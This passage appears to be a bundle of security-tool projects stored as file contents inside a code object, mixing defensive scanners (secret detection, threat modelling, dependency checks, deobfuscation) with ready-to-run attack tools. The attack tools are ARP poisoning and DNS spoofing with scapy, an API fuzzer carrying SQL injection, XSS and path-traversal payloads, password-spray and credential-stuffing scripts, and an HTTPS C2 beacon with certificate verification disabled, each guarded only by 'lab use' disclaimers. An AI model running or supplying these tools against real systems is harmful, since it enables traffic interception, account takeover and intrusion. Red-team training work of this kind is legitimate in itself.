      "README.md": `# SecureCI — Security Gate for Every Pull Request\n\nPre-merge security checks: SAST, SCA, secret scanning, and licence compliance.\n\n\`\`\`bash\npython3 secure_ci.py --path ./\n\`\`\`\n`,
      "secure_ci.py": `#!/usr/bin/env python3\nimport argparse, os, re, json, subprocess\nfrom pathlib import Path\nfrom datetime import datetime\n\nSECRET_PATTERNS = [\n    (r'(?i)api[_-]?key\\s*[=:]\\s*[\'\"]?[A-Za-z0-9_\\-]{20,}', 'Potential API key'),\n    (r'(?i)(password|passwd|pwd)\\s*[=:]\\s*[\'\"]?[^\\s\'\",]{6,}', 'Hardcoded password'),\n    (r'(?i)secret\\s*[=:]\\s*[\'\"]?[A-Za-z0-9_\\-]{10,}', 'Hardcoded secret'),\n    (r'github_pat_[A-Za-z0-9_]{20,}', 'GitHub Personal Access Token'),\n    (r'sk-[A-Za-z0-9]{48}', 'OpenAI API Key'),\n    (r'AKIA[0-9A-Z]{16}', 'AWS Access Key'),\n    (r'-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----', 'Private key'),\n]\n\ndef scan_secrets(root: str) -> list:\n    findings = []\n    skip_dirs = {'node_modules', '.git', 'dist', 'build', '__pycache__', '.venv'}\n    for p in Path(root).rglob('*'):\n        if p.is_file() and not any(skip in p.parts for skip in skip_dirs):\n            try:\n                text = p.read_text(errors='ignore')\n                for pattern, desc in SECRET_PATTERNS:\n                    for m in re.finditer(pattern, text):\n                        line_num = text[:m.start()].count('\\n') + 1\n                        findings.append({'file': str(p), 'line': line_num, 'type': desc,\n                                          'severity': 'CRITICAL', 'match': m.group()[:40] + '...'})\n            except: pass\n    return findings\n\ndef check_npm_audit(root: str) -> list:\n    pkg = Path(root) / 'package.json'\n    if not pkg.exists(): return []\n    try:\n        result = subprocess.run(['npm', 'audit', '--json'], cwd=root, capture_output=True, text=True, timeout=60)\n        data = json.loads(result.stdout)\n        vulns = data.get('vulnerabilities', {})\n        findings = []\n        for pkg_name, info in list(vulns.items())[:10]:\n            sev = info.get('severity', 'unknown').upper()\n            findings.append({'package': pkg_name, 'severity': sev, 'type': 'SCA'})\n        return findings\n    except: return []\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--path', default='.')\n    ap.add_argument('--output', default='secure_ci_report.json')\n    args = ap.parse_args()\n    secrets = scan_secrets(args.path)\n    sca = check_npm_audit(args.path)\n    all_findings = [{'source': 'secret_scan', **f} for f in secrets] + [{'source': 'sca', **f} for f in sca]\n    critical = sum(1 for f in all_findings if f.get('severity') == 'CRITICAL')\n    report = {'timestamp': datetime.now().isoformat(), 'path': args.path,\n              'total': len(all_findings), 'critical': critical, 'findings': all_findings}\n    with open(args.output, 'w') as f: json.dump(report, f, indent=2)\n    print(f'[SecureCI] {len(all_findings)} findings ({critical} CRITICAL)')\n    for f in all_findings[:5]: print(f'  [{f["severity"]}] {f.get("type","")} — {f.get("file",f.get("package",""))}')\n    if critical > 0: print(f'[!] SECURITY GATE FAILED: {critical} critical issues'); exit(1)\n    else: print('[+] Security gate PASSED')\n`,
    },

    // ── ThreatModel.AI — Automated Threat Modelling ────────────────────────────
    "threat-model": {
      "README.md": `# ThreatModel.AI — Automated Threat Modelling for Developers\n\nGenerate STRIDE threat models from architecture diagrams and code automatically.\n\n\`\`\`bash\npython3 threat_model_ai.py --arch architecture.json --openai-key YOUR_KEY\n\`\`\`\n`,
      "threat_model_ai.py": `#!/usr/bin/env python3\nimport argparse, json\nfrom datetime import datetime\n\nSTRIDE = {\n  'S': 'Spoofing',\n  'T': 'Tampering',\n  'R': 'Repudiation',\n  'I': 'Information Disclosure',\n  'D': 'Denial of Service',\n  'E': 'Elevation of Privilege',\n}\n\nCOMPONENT_THREATS = {\n  'api': [\n    ('S', 'Attacker impersonates legitimate user by stealing JWT token', 'HIGH', 'Implement token rotation and binding'),\n    ('I', 'API exposes sensitive data in error responses', 'MEDIUM', 'Sanitise error messages in production'),\n    ('D', 'API overwhelmed by unauthenticated requests', 'HIGH', 'Implement rate limiting and WAF'),\n    ('E', 'IDOR allows access to other users\' resources', 'HIGH', 'Enforce authorisation on every object access'),\n  ],\n  'database': [\n    ('T', 'SQL injection modifies or exfiltrates data', 'CRITICAL', 'Use parameterised queries'),\n    ('I', 'Database credentials in source code', 'CRITICAL', 'Use secrets manager'),\n    ('D', 'Database resource exhaustion via expensive queries', 'MEDIUM', 'Implement query timeout and connection pooling'),\n  ],\n  'web': [\n    ('S', 'CSRF forces authenticated user to perform actions', 'HIGH', 'Implement CSRF tokens'),\n    ('I', 'XSS exfiltrates session tokens', 'HIGH', 'Implement CSP and input sanitisation'),\n    ('I', 'Sensitive data in localStorage accessible to XSS', 'HIGH', 'Use httpOnly cookies for tokens'),\n  ],\n  'auth': [\n    ('S', 'Brute force attack on login endpoint', 'HIGH', 'Rate limit auth endpoints, implement lockout'),\n    ('S', 'Password reset token predictable', 'HIGH', 'Use cryptographically random tokens'),\n    ('I', 'Timing attack reveals valid email addresses', 'MEDIUM', 'Return identical responses for valid/invalid emails'),\n  ],\n}\n\ndef generate_threat_model(components: list, ai_key: str = None) -> dict:\n    threats = []\n    for component in components:\n        component_threats = COMPONENT_THREATS.get(component.lower(), [])\n        for stride_id, desc, severity, mitigation in component_threats:\n            threats.append({\n                'component': component,\n                'stride': f'{stride_id} — {STRIDE[stride_id]}',\n                'threat': desc,\n                'severity': severity,\n                'mitigation': mitigation,\n            })\n    if ai_key:\n        try:\n            import openai\n            client = openai.OpenAI(api_key=ai_key)\n            r = client.chat.completions.create(\n                model='gpt-4o-mini',\n                messages=[{'role': 'user', 'content': f'Add 3 additional STRIDE threats for a system with components: {components}. Return as JSON array with fields: component, stride, threat, severity, mitigation'}],\n                max_tokens=500\n            )\n            import re\n            json_match = re.search(r'\\[.*?\\]', r.choices[0].message.content, re.DOTALL)\n            if json_match: threats.extend(json.loads(json_match.group()))\n        except Exception as e: print(f'[!] AI enrichment failed: {e}')\n    threats.sort(key=lambda x: {'CRITICAL':0,'HIGH':1,'MEDIUM':2,'LOW':3}.get(x['severity'],4))\n    return {'generated_at': datetime.now().isoformat(), 'components': components,\n            'total_threats': len(threats), 'threats': threats}\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--components', default='api,database,web,auth')\n    ap.add_argument('--openai-key')\n    ap.add_argument('--output', default='threat_model.json')\n    args = ap.parse_args()\n    components = [c.strip() for c in args.components.split(',')]\n    model = generate_threat_model(components, args.openai_key)\n    with open(args.output, 'w') as f: json.dump(model, f, indent=2)\n    print(f'[+] Threat model: {model["total_threats"]} threats identified')\n    for t in model['threats'][:5]: print(f'  [{t["severity"]}] {t["component"]}: {t["threat"][:60]}')\n`,
      "requirements.txt": `openai>=1.10.0\n`,
    },

  
    // ── PacketPoison — Live Network Attack Simulator ──────────────────────────────
    "packet-poison": {
      "README.md": `# PacketPoison — Live Network Attack Simulator\n\nSimulate network attacks (ARP poisoning, DNS spoofing, TCP hijacking) in an isolated lab.\n\n\`\`\`bash\ndocker-compose up\npython3 poison.py --mode arp --interface eth0 --target 172.20.0.2 --gateway 172.20.0.1\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "poison.py": `#!/usr/bin/env python3\nimport argparse\n\ndef arp_poison_sim(interface: str, target: str, gateway: str):\n    print(f'[*] ARP Poison Simulator — interface: {interface}')\n    print('[*] AUTHORISED / ISOLATED LAB USE ONLY')\n    try:\n        from scapy.all import ARP, Ether, sendp, get_if_hwaddr\n        import time, threading\n        attacker_mac = get_if_hwaddr(interface)\n        def poison():\n            while True:\n                # Tell target: gateway MAC = attacker MAC\n                t_pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=2, pdst=target, psrc=gateway, hwsrc=attacker_mac)\n                # Tell gateway: target MAC = attacker MAC\n                g_pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=2, pdst=gateway, psrc=target, hwsrc=attacker_mac)\n                sendp([t_pkt, g_pkt], iface=interface, verbose=False)\n                print(f'[*] ARP spoofed — {target} <-> {gateway} via {interface}')\n                time.sleep(2)\n        threading.Thread(target=poison, daemon=True).start()\n        print('[*] ARP poisoning running. Press Ctrl+C to stop and restore.')\n        while True: time.sleep(1)\n    except KeyboardInterrupt:\n        print('\\n[*] Restoring ARP tables...')\n    except ImportError: print('[!] Install scapy: pip install scapy')\n    except PermissionError: print('[!] Root/Administrator privileges required')\n\ndef dns_spoof_sim(interface: str, domain: str, redirect_ip: str):\n    print(f'[*] DNS Spoof Simulator — {domain} -> {redirect_ip}')\n    print('[*] ISOLATED LAB USE ONLY')\n    try:\n        from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, send\n        def process(pkt):\n            if pkt.haslayer(DNSQR) and domain in str(pkt[DNSQR].qname):\n                print(f'[+] Spoofing DNS query for {pkt[DNSQR].qname}')\n                resp = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /\n                        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\n                        DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\n                            an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=redirect_ip)))\n                send(resp, verbose=False)\n        sniff(iface=interface, filter='udp port 53', prn=process)\n    except ImportError: print('[!] Install scapy: pip install scapy')\n    except PermissionError: print('[!] Root/Administrator privileges required')\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--mode', choices=['arp','dns'], required=True)\n    ap.add_argument('--interface', required=True)\n    ap.add_argument('--target')\n    ap.add_argument('--gateway')\n    ap.add_argument('--domain')\n    ap.add_argument('--redirect-ip')\n    args = ap.parse_args()\n    if args.mode == 'arp': arp_poison_sim(args.interface, args.target, args.gateway)\n    elif args.mode == 'dns': dns_spoof_sim(args.interface, args.domain, args.redirect_ip)\n`,
      "requirements.txt": `scapy>=2.5.0\n`,
    },

    // ── APIFuzz — Intelligent REST & GraphQL API Fuzzer ──────────────────────────
    "api-fuzz": {
      "README.md": `# APIFuzz — Intelligent REST & GraphQL API Fuzzer\n\nAutomated API fuzzing with OpenAPI spec parsing, mutation-based fuzzing, and vulnerability detection.\n\n\`\`\`bash\npython3 api_fuzz.py --spec openapi.json --base-url https://api.example.com\npython3 api_fuzz.py --base-url https://api.example.com --discover\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "api_fuzz.py": `#!/usr/bin/env python3\nimport argparse, requests, json, itertools, random\nfrom datetime import datetime\n\nFUZZ_PAYLOADS = {\n  'sql': [\"' OR 1=1--\", '\" OR 1=1--', \"1; DROP TABLE users--\", \"1' UNION SELECT 1,2,3--\"],\n  'xss': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '\"><script>alert(1)</script>'],\n  'path_traversal': ['../../../etc/passwd', '..\\\\..\\\\..\\\\windows\\\\system32\\\\cmd.exe', '%2e%2e%2f%2e%2e%2f'],\n  'ssti': ['{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}'],\n  'integer': [-1, 0, 99999999, 2**31-1, 2**63-1, -2**31],\n  'special': [None, '', ' ', '\\x00', '\\n\\r', 'a' * 10000],\n}\n\ndef fuzz_endpoint(base_url: str, path: str, method: str = 'GET', params: dict = None) -> list:\n    findings = []\n    session = requests.Session()\n    session.timeout = 10\n    for category, payloads in FUZZ_PAYLOADS.items():\n        for payload in payloads[:2]:  # Test first 2 of each type\n            fuzz_params = dict(params or {})\n            for key in (fuzz_params or {'q': payload}).keys():\n                fuzz_params[key] = payload\n            try:\n                r = session.request(method, f'{base_url}{path}', params=fuzz_params if method=='GET' else None,\n                                    json=fuzz_params if method!='GET' else None, allow_redirects=False)\n                issues = []\n                if r.status_code == 500: issues.append('Server error (500) — possible crash')\n                if category == 'sql' and any(e in r.text.lower() for e in ['sql syntax','mysql_','ora-','pg_']): issues.append('SQL error in response')\n                if category == 'xss' and str(payload) in r.text: issues.append('Reflected XSS payload')\n                if category == 'ssti' and '49' in r.text: issues.append('SSTI: 7*7=49 evaluated')\n                for issue in issues:\n                    findings.append({'path': path, 'method': method, 'payload_type': category,\n                                     'payload': str(payload)[:50], 'status': r.status_code, 'issue': issue, 'severity': 'HIGH'})\n            except Exception as e: pass\n    return findings\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--base-url', required=True)\n    ap.add_argument('--spec')\n    ap.add_argument('--endpoints', default='/api/users,/api/search,/api/login')\n    ap.add_argument('--output', default='apifuzz_report.json')\n    args = ap.parse_args()\n    print(f'[*] APIFuzz — target: {args.base_url}')\n    print('[*] AUTHORISED USE ONLY')\n    endpoints = [e.strip() for e in args.endpoints.split(',')]\n    all_findings = []\n    for ep in endpoints:\n        findings = fuzz_endpoint(args.base_url, ep)\n        all_findings.extend(findings)\n        if findings: print(f'  [!] {ep}: {len(findings)} issues')\n        else: print(f'  [+] {ep}: no issues')\n    report = {'target': args.base_url, 'timestamp': datetime.now().isoformat(),\n              'total_findings': len(all_findings), 'findings': all_findings}\n    with open(args.output, 'w') as f: json.dump(report, f, indent=2)\n    print(f'[+] {len(all_findings)} total findings written to {args.output}')\n`,
      "requirements.txt": `requests>=2.31.0\n`,
    },

    // ── DeObfuscator Pro ──────────────────────────────────────────────────────────
    "deobfuscator": {
      "README.md": `# DeObfuscator Pro — JS/PowerShell/VBA Deobfuscation Engine\n\nStatically deobfuscates malicious scripts for malware analysis.\n\n\`\`\`bash\npython3 deobfuscate.py --input malicious.ps1 --lang powershell\npython3 deobfuscate.py --input obfuscated.js --lang javascript\n\`\`\`\n`,
      "deobfuscate.py": `#!/usr/bin/env python3\nimport argparse, re, base64, binascii\n\ndef deob_javascript(code: str) -> str:\n    # Decode base64 strings\n    def decode_b64(m):\n        try: return repr(base64.b64decode(m.group(1)).decode('utf-8', errors='replace'))\n        except: return m.group(0)\n    code = re.sub(r'atob\\(\\'([A-Za-z0-9+/=]+)\\'\\)', decode_b64, code)\n    code = re.sub(r'atob\\(\"([A-Za-z0-9+/=]+)\"\\)', decode_b64, code)\n    # Decode \\xXX hex escapes\n    def decode_hex(m):\n        try: return repr(bytes.fromhex(m.group(1)).decode('utf-8', errors='replace'))\n        except: return m.group(0)\n    code = re.sub(r'\\\\x([0-9a-fA-F]{2})', decode_hex, code)\n    # Decode eval(String.fromCharCode(...))\n    def decode_charcode(m):\n        nums = [int(n) for n in m.group(1).split(',')]\n        return repr(''.join(chr(n) for n in nums))\n    code = re.sub(r'String\\.fromCharCode\\(([0-9, ]+)\\)', decode_charcode, code)\n    return code\n\ndef deob_powershell(code: str) -> str:\n    # Decode -EncodedCommand base64\n    def decode_encoded_cmd(m):\n        try: return base64.b64decode(m.group(1)).decode('utf-16-le', errors='replace')\n        except: return m.group(0)\n    code = re.sub(r'-[Ee]n?c?o?d?e?d?C?o?m?m?a?n?d?\\s+([A-Za-z0-9+/=]+)', decode_encoded_cmd, code)\n    # Decode [char] casts\n    def decode_char(m): return repr(chr(int(m.group(1))))\n    code = re.sub(r'\\[char\\]\\s*(\\d+)', decode_char, code, flags=re.IGNORECASE)\n    # Decode hex strings\n    def decode_hex(m):\n        try: return repr(bytes.fromhex(m.group(1)).decode('utf-8', errors='replace'))\n        except: return m.group(0)\n    code = re.sub(r'0x([0-9a-fA-F]+)', decode_hex, code)\n    # Remove obfuscating backticks\n    code = re.sub(r'\`+', '', code)\n    return code\n\ndef deob_vba(code: str) -> str:\n    # Decode Chr() calls\n    def decode_chr(m): return repr(chr(int(m.group(1))))\n    code = re.sub(r'Chr\\((\\d+)\\)', decode_chr, code, flags=re.IGNORECASE)\n    # Collapse string concatenation\n    code = re.sub(r'\"\\s*&\\s*\"', '', code)\n    return code\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--input', required=True)\n    ap.add_argument('--lang', choices=['javascript','powershell','vba'], required=True)\n    ap.add_argument('--output')\n    args = ap.parse_args()\n    with open(args.input) as f: code = f.read()\n    if args.lang == 'javascript': result = deob_javascript(code)\n    elif args.lang == 'powershell': result = deob_powershell(code)\n    elif args.lang == 'vba': result = deob_vba(code)\n    out = args.output or args.input + '.deob'\n    with open(out, 'w') as f: f.write(result)\n    print(f'[+] Deobfuscated output written to {out}')\n    print(f'[+] Size reduced from {len(code)} to {len(result)} chars')\n`,
    },

    // ── CredSniper Pro — Password Spray & Stuffing Lab ───────────────────────────
    "cred-sniper": {
      "README.md": `# CredSniper Pro — Password Spray & Stuffing Lab\n\nEducational credential attack simulation for authorised red team exercises.\n\n\`\`\`bash\npython3 cred_sniper.py --mode spray --target-url https://lab.example.com/login --users users.txt --password 'Summer2024!'\npython3 cred_sniper.py --mode stuffing --target-url https://lab.example.com/login --combos combos.txt\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "cred_sniper.py": `#!/usr/bin/env python3\nimport argparse, requests, time, json\nfrom datetime import datetime\n\ndef password_spray(target_url: str, users_file: str, password: str, delay: float = 1.0) -> list:\n    print(f'[*] Password Spray — target: {target_url}')\n    print('[*] AUTHORISED RED TEAM USE ONLY')\n    with open(users_file) as f: users = [l.strip() for l in f if l.strip()]\n    hits = []\n    for user in users:\n        try:\n            r = requests.post(target_url, data={'username': user, 'password': password},\n                              timeout=10, allow_redirects=False)\n            success = r.status_code in (200, 302) and 'invalid' not in r.text.lower() and 'error' not in r.text.lower()\n            status = 'HIT' if success else 'miss'\n            print(f'  {status}: {user}:{password} -> {r.status_code}')\n            if success: hits.append({'user': user, 'password': password, 'status': r.status_code})\n        except Exception as e: print(f'  [!] Error for {user}: {e}')\n        time.sleep(delay)\n    print(f'[+] Spray complete: {len(hits)}/{len(users)} hits')\n    return hits\n\ndef credential_stuffing(target_url: str, combos_file: str, delay: float = 0.5) -> list:\n    print(f'[*] Credential Stuffing — target: {target_url}')\n    print('[*] AUTHORISED RED TEAM USE ONLY')\n    with open(combos_file) as f:\n        combos = [l.strip().split(':',1) for l in f if ':' in l.strip()]\n    hits = []\n    for combo in combos:\n        if len(combo) != 2: continue\n        user, pwd = combo\n        try:\n            r = requests.post(target_url, data={'username': user, 'password': pwd},\n                              timeout=10, allow_redirects=False)\n            success = r.status_code in (200, 302) and 'invalid' not in r.text.lower()\n            if success:\n                print(f'  [HIT] {user}:{pwd}')\n                hits.append({'user': user, 'password': pwd})\n        except: pass\n        time.sleep(delay)\n    return hits\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--mode', choices=['spray','stuffing'], required=True)\n    ap.add_argument('--target-url', required=True)\n    ap.add_argument('--users')\n    ap.add_argument('--password')\n    ap.add_argument('--combos')\n    ap.add_argument('--delay', type=float, default=1.0)\n    ap.add_argument('--output', default='cred_results.json')\n    args = ap.parse_args()\n    if args.mode == 'spray': hits = password_spray(args.target_url, args.users, args.password, args.delay)\n    else: hits = credential_stuffing(args.target_url, args.combos, args.delay)\n    with open(args.output, 'w') as f: json.dump({'timestamp': datetime.now().isoformat(), 'hits': hits}, f, indent=2)\n    print(f'[+] {len(hits)} valid credentials. Results: {args.output}')\n`,
      "requirements.txt": `requests>=2.31.0\n`,
    },

  
    // ── RansomSim — Ransomware Behaviour Simulator ────────────────────────────────
    "ransomware-sim": {
      "README.md": `# RansomSim — Ransomware Behaviour Simulator for IR Training\n\nSimulates ransomware behaviour patterns for incident response training. NO actual encryption.\n\n\`\`\`bash\npython3 ransomware_sim.py --mode simulate --dir /tmp/test_files\npython3 ransomware_sim.py --mode report\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "ransomware_sim.py": `#!/usr/bin/env python3\n\"\"\"\nRansomSim — Ransomware Behaviour Simulator\nFor Incident Response Training ONLY — no actual encryption occurs.\n\"\"\"\nimport argparse, os, json, time, random\nfrom pathlib import Path\nfrom datetime import datetime\n\nBEHAVIOUR_LOG = []\n\ndef log_event(event_type: str, detail: str):\n    entry = {'timestamp': datetime.now().isoformat(), 'type': event_type, 'detail': detail}\n    BEHAVIOUR_LOG.append(entry)\n    print(f'  [SIM] {event_type}: {detail}')\n\ndef simulate_recon(target_dir: str):\n    \"\"\"Simulate ransomware recon phase — enumerate files\"\"\"\n    print('\\n[Phase 1] Reconnaissance')\n    path = Path(target_dir)\n    extensions = {}\n    file_count = 0\n    for f in path.rglob('*'):\n        if f.is_file():\n            ext = f.suffix.lower()\n            extensions[ext] = extensions.get(ext, 0) + 1\n            file_count += 1\n    log_event('FILE_RECON', f'Enumerated {file_count} files in {target_dir}')\n    log_event('EXT_RECON', f'Extensions found: {dict(list(extensions.items())[:10])}')\n    valuable = [ext for ext in extensions if ext in ['.doc','.docx','.pdf','.xls','.xlsx','.jpg','.png','.sql','.db','.ppt','.pptx']]\n    log_event('TARGET_SELECTION', f'Valuable extensions: {valuable}')\n    return file_count, extensions\n\ndef simulate_c2_checkin():\n    \"\"\"Simulate C2 beacon (no actual network connection)\"\"\"\n    print('\\n[Phase 2] C2 Communication')\n    log_event('C2_BEACON', 'Simulating C2 check-in (no actual connection made)')\n    log_event('C2_RESPONSE', 'Simulating: received encryption key from C2 (not real)')\n    log_event('VICTIM_ID', f'Generated victim ID: VIC-{random.randint(10000,99999)}')\n\ndef simulate_encryption(target_dir: str, dry_run: bool = True):\n    \"\"\"Simulate encryption — logs actions but does NOT encrypt anything\"\"\"\n    print('\\n[Phase 3] Encryption Simulation (DRY RUN — no actual encryption)')\n    path = Path(target_dir)\n    simulated = 0\n    for f in list(path.rglob('*'))[:20]:  # Only log first 20\n        if f.is_file():\n            log_event('WOULD_ENCRYPT', str(f))\n            simulated += 1\n    log_event('ENCRYPT_COMPLETE', f'Would have encrypted {simulated} files (SIMULATION ONLY)')\n    log_event('RANSOMNOTE', 'Would drop ransom note: YOUR_FILES_ARE_ENCRYPTED.txt')\n\ndef generate_ir_report() -> dict:\n    print('\\n[Phase 4] Generating IR Training Report')\n    return {\n        'simulation_timestamp': datetime.now().isoformat(),\n        'behaviour_log': BEHAVIOUR_LOG,\n        'ioc_patterns': {\n            'file_extensions_targeted': ['.doc','.xls','.pdf','.jpg','.sql'],\n            'c2_technique': 'HTTP beacon to hardcoded IP (simulated)',\n            'persistence': 'Registry run key (not executed in sim)',\n            'lateral_movement': 'SMB share enumeration (simulated)',\n        },\n        'mitre_techniques': [\n            'T1083 — File and Directory Discovery',\n            'T1071 — Application Layer Protocol (C2)',\n            'T1486 — Data Encrypted for Impact',\n            'T1547 — Boot/Logon Autostart Execution',\n        ],\n        'detection_rules': [\n            'Alert on mass file rename events (>100 in 30s)',\n            'Alert on new process writing to >50 files',\n            'Block known ransomware C2 IOCs',\n            'Enable VSS shadow copy protection',\n        ],\n    }\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--mode', choices=['simulate','report'], default='simulate')\n    ap.add_argument('--dir', default='/tmp/ransomsim_test')\n    ap.add_argument('--output', default='ransomsim_report.json')\n    args = ap.parse_args()\n    print('[*] RansomSim — Ransomware Behaviour Simulator')\n    print('[*] NO actual encryption will occur — this is a training tool')\n    if args.mode == 'simulate':\n        os.makedirs(args.dir, exist_ok=True)\n        # Create test files\n        for i in range(5): Path(f'{args.dir}/test_{i}.txt').write_text(f'Test file {i}')\n        simulate_recon(args.dir)\n        simulate_c2_checkin()\n        simulate_encryption(args.dir)\n    report = generate_ir_report()\n    with open(args.output, 'w') as f: json.dump(report, f, indent=2)\n    print(f'[+] IR training report saved: {args.output}')\n    print(f'[+] MITRE techniques: {len(report["mitre_techniques"])}')\n`,
    },

    // ── SupplyChain Guard ──────────────────────────────────────────────────────────
    "supply-chain": {
      "README.md": `# SupplyChain Guard — Third-Party Dependency Risk Scorer\n\nAnalyse your project dependencies for supply chain risks: malicious packages, typosquatting, abandoned projects.\n\n\`\`\`bash\npython3 supply_chain.py --path ./package.json\npython3 supply_chain.py --path ./requirements.txt --ecosystem pip\n\`\`\`\n`,
      "supply_chain.py": `#!/usr/bin/env python3\nimport argparse, json, re, requests\nfrom pathlib import Path\nfrom datetime import datetime, timezone\n\ndef parse_npm(path: str) -> dict:\n    with open(path) as f: data = json.load(f)\n    deps = {}\n    deps.update(data.get('dependencies', {}))\n    deps.update(data.get('devDependencies', {}))\n    return deps\n\ndef parse_pip(path: str) -> dict:\n    deps = {}\n    with open(path) as f:\n        for line in f:\n            line = line.strip()\n            if line and not line.startswith('#'):\n                m = re.match(r'^([A-Za-z0-9_\\-\\.]+)', line)\n                if m: deps[m.group(1)] = '*'\n    return deps\n\ndef check_npm_package(name: str, version: str) -> dict:\n    try:\n        r = requests.get(f'https://registry.npmjs.org/{name}', timeout=10)\n        if r.status_code == 404: return {'name': name, 'risk': 'HIGH', 'issue': 'Package not found — possible typosquat'}\n        data = r.json()\n        issues = []\n        # Check maintenance\n        latest = data.get('dist-tags', {}).get('latest')\n        if latest:\n            latest_data = data.get('versions', {}).get(latest, {})\n            published = data.get('time', {}).get(latest, '')\n            if published:\n                from datetime import datetime\n                pub_date = datetime.fromisoformat(published.replace('Z', '+00:00'))\n                days_old = (datetime.now(timezone.utc) - pub_date).days\n                if days_old > 730: issues.append(f'Last update {days_old} days ago — possibly abandoned')\n        # Check maintainers\n        maintainers = data.get('maintainers', [])\n        if len(maintainers) == 1: issues.append('Single maintainer — higher supply chain risk')\n        risk = 'HIGH' if any('abandon' in i for i in issues) else 'MEDIUM' if issues else 'LOW'\n        return {'name': name, 'risk': risk, 'issues': issues,\n                'downloads_weekly': data.get('downloads', {}).get('weekly', 'unknown')}\n    except Exception as e: return {'name': name, 'risk': 'UNKNOWN', 'error': str(e)}\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--path', required=True)\n    ap.add_argument('--ecosystem', choices=['npm','pip'], default='npm')\n    ap.add_argument('--output', default='supply_chain_report.json')\n    args = ap.parse_args()\n    if args.ecosystem == 'npm': deps = parse_npm(args.path)\n    else: deps = parse_pip(args.path)\n    print(f'[*] Analysing {len(deps)} dependencies ({args.ecosystem})')\n    results = []\n    for name, version in list(deps.items())[:20]:\n        result = check_npm_package(name, version) if args.ecosystem == 'npm' else {'name': name, 'risk': 'PENDING', 'note': 'PyPI analysis coming soon'}\n        results.append(result)\n        risk_icon = '🔴' if result['risk'] == 'HIGH' else '🟡' if result['risk'] == 'MEDIUM' else '✅'\n        print(f'  {name}: {result["risk"]}')\n    high = sum(1 for r in results if r['risk'] == 'HIGH')\n    report = {'timestamp': datetime.now().isoformat(), 'ecosystem': args.ecosystem,\n              'total_deps': len(deps), 'analysed': len(results), 'high_risk': high, 'packages': results}\n    with open(args.output, 'w') as f: json.dump(report, f, indent=2)\n    print(f'[+] {high} high-risk packages found. Report: {args.output}')\n`,
      "requirements.txt": `requests>=2.31.0\n`,
    },

    // ── GhostTraffic — Encrypted C2 over Legitimate Protocols ────────────────────
    "ghost-traffic": {
      "README.md": `# GhostTraffic — Encrypted C2 over Legitimate Protocols\n\nEducational demonstration of C2 communication over DNS, HTTP, and WebSocket tunnels.\n\n\`\`\`bash\npython3 ghost_traffic.py --mode dns-tunnel --domain c2.lab.local\npython3 ghost_traffic.py --mode https-beacon --url https://lab.example.com/api\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "ghost_traffic.py": `#!/usr/bin/env python3\n\"\"\"\nGhostTraffic — Educational C2 over legitimate protocols\nFor red team simulation and defensive detection research ONLY.\n\"\"\"\nimport argparse, base64, socket, json, time, threading\nfrom datetime import datetime\n\ndef dns_tunnel_sim(domain: str, message: str = 'beacon'):\n    \"\"\"Simulate DNS-based C2 (educational — shows detection techniques)\"\"\"\n    print(f'[*] DNS Tunnel Simulation — domain: {domain}')\n    print('[*] EDUCATIONAL ONLY — no actual malicious DNS queries')\n    # Encode message as DNS label (as real attackers do)\n    encoded = base64.b32encode(message.encode()).decode().replace('=','').lower()\n    subdomain = f'{encoded}.{domain}'\n    print(f'[*] Would send DNS query: {subdomain}')\n    print(f'[*] Encoded payload: {encoded}')\n    print()\n    print('[*] Detection signatures:')\n    print('  - DNS queries with unusually long subdomains (>50 chars)')\n    print('  - High frequency DNS queries to same TLD')\n    print('  - Base32/Base64 encoded subdomains')\n    print('  - DNS TXT record requests to unknown domains')\n\ndef https_beacon_sim(url: str, interval: int = 30):\n    \"\"\"Simulate HTTPS C2 beacon\"\"\"\n    print(f'[*] HTTPS Beacon Simulation — {url}')\n    print('[*] EDUCATIONAL ONLY')\n    import urllib.request, ssl\n    ctx = ssl.create_default_context()\n    ctx.check_hostname = False\n    ctx.verify_mode = ssl.CERT_NONE\n    for i in range(3):\n        beacon_data = json.dumps({'jitter': int(interval * 0.2), 'id': 'SIM_AGENT', 'sim': True}).encode()\n        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}\n        req = urllib.request.Request(url, data=beacon_data, headers=headers, method='POST')\n        try:\n            with urllib.request.urlopen(req, context=ctx, timeout=5) as r: print(f'  [*] Beacon {i+1}: {r.status}')\n        except Exception as e: print(f'  [*] Beacon {i+1}: {e} (expected in sim)')\n        time.sleep(2)\n    print('[*] Detection signatures: periodic outbound HTTPS to C2 IP, consistent timing, encoded payloads')\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--mode', choices=['dns-tunnel','https-beacon'], required=True)\n    ap.add_argument('--domain')\n    ap.add_argument('--url')\n    ap.add_argument('--interval', type=int, default=30)\n    args = ap.parse_args()\n    if args.mode == 'dns-tunnel': 